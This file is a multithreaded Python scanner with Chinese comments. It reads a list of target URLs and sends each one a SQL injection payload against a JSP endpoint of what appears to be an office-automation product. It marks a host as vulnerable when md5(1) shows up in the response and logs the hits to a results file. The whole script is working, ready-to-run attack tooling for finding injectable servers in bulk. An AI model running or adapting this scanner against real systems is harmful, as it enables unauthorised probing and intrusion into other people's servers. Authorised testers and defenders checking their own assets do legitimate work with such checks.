import requests
import threading
from urllib.parse import urljoin
import time
import sys

# 禁用SSL警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁用于文件写入
file_lock = threading.Lock()

def check_vulnerability(url, results_file):
    """
    检测单个URL是否存在漏洞
    """
    try:
        # 构造完整的请求URL
        vuln_path = "/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5(1)%20%23"
        target_url = urljoin(url.rstrip('/') + '/', vuln_path.lstrip('/'))
        
        # 设置请求头
        headers = {
            "Host": "127.0.0.1",
            "User-Agent": "Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "Keep-Alive"
        }
        
        # 发送请求并记录时间
        start_time = time.time()
        response = requests.get(
            target_url, 
            headers=headers, 
            verify=False, 
            timeout=10,
            allow_redirects=False
        )
        response_time = time.time() - start_time
        
        # 检查漏洞条件
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            # 漏洞存在，写入结果文件
            result = f"[+] 漏洞存在: {target_url}\n"
            result += f"    状态码: {response.status_code}\n"
            result += f"    响应时间: {response_time:.2f}秒\n"
            result += f"    检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            result += "-" * 50 + "\n"
            
            with file_lock:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(result)
            
            print(f"[+] 漏洞存在: {target_url} (响应时间: {response_time:.2f}s)")
        else:
            print(f"[-] 漏洞不存在: {url}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {url} - 错误: {str(e)}")
    except Exception as e:
        print(f"[!] 检测过程中出现异常: {url} - 错误: {str(e)}")

def main():
    # 文件路径
    url_file = "url.txt"
    results_file = "result.txt"
    
    # 检查URL文件是否存在
    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] 错误: 找不到 {url_file} 文件")
        return
    except Exception as e:
        print(f"[!] 读取 {url_file} 文件时出错: {str(e)}")
        return
    
    if not urls:
        print("[!] 错误: url.txt 文件中没有有效的URL")
        return
    
    print(f"[*] 开始检测漏洞，共 {len(urls)} 个URL")
    print(f"[*] 线程数: 50")
    print(f"[*] 结果将保存到: {results_file}")
    print("-" * 60)
    
    # 清空或创建结果文件
    with open(results_file, 'w', encoding='utf-8') as f:
        f.write(f"漏洞检测报告\n")
        f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"检测URL数量: {len(urls)}\n")
        f.write("=" * 50 + "\n\n")
    
    # 创建线程池
    threads = []
    max_threads = 50
    
    # 分批处理URL，避免一次性创建过多线程
    for i in range(0, len(urls), max_threads):
        batch_urls = urls[i:i + max_threads]
        
        # 为当前批次的每个URL创建线程
        for url in batch_urls:
            thread = threading.Thread(target=check_vulnerability, args=(url, results_file))
            threads.append(thread)
            thread.start()
            
            # 添加微小延迟避免同时发起过多请求
            time.sleep(0.01)
        
        # 等待当前批次的所有线程完成
        for thread in threads:
            thread.join()
        
        # 清空线程列表准备下一批次
        threads.clear()
        
        # 批次间延迟
        if i + max_threads < len(urls):
            print(f"[*] 已完成 {min(i + max_threads, len(urls))}/{len(urls)} 个URL检测")
            time.sleep(1)
    
    print("-" * 60)
    print(f"[*] 漏洞检测完成")
    print(f"[*] 详细结果请查看: {results_file}")

if __name__ == "__main__":
    main()